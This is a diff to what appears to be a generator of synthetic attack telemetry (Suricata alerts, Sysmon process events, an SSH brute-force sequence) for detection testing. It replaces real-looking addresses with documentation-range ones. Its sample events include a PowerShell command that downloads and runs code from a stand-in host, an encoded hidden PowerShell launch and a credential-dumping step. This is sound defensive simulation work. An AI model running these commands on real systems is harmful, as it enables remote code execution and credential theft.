@@ -79,7 +79,7 @@ def _suricata(utc: datetime, sport: int, dport: int, sig: str, sid: int) -> Even
     return {
         "_stream": "suricata", "_log": "eve", "_stage": "command-and-control",
         "_technique": "T1071.001", "UtcTime": _t(utc), "event_type": "alert",
-        "src_ip": CAP_IP, "src_port": sport, "dest_ip": "45.61.136.200",
+        "src_ip": CAP_IP, "src_port": sport, "dest_ip": "203.0.113.200",
         "dest_port": dport, "proto": "TCP",
         "alert": {"signature": sig, "signature_id": sid,
                   "category": "A Network Trojan was Detected", "severity": 1, "action": "allowed"},
@@ -103,7 +103,7 @@ def build_bruteforce() -> BundleSpec:
     """SSH brute force against srv-app-01 from one external source: ~40 failed
     logons for a nonexistent user, then a success; Wazuh rule 5710 fires."""
     base = datetime(2026, 1, 5, 2, 0, 0)
-    ip = "185.220.101.42"
+    ip = "198.51.100.42"
     events: list[tuple[Event, str]] = []
     for i in range(40):
         utc = base + timedelta(seconds=7 * i)
@@ -272,7 +272,7 @@ def build_commodity() -> BundleSpec:
                   '"powershell.exe" -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A...',
                   "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", 1001), "execution"),
         (_sysmon1(base + timedelta(seconds=8), "execution", "T1059.001", ps,
-                  '"powershell.exe" IEX (New-Object Net.WebClient).DownloadString(\'http://45.61.136.200/a\')',
+                  '"powershell.exe" IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.200/a\')',
                   ps, '"powershell.exe" -NoP -W Hidden -Enc ...', 1002), "execution"),
         (_sysmon1(base + timedelta(seconds=30), "credential-access", "T1003.001",
                   "C:\\Windows\\System32\\rundll32.exe",
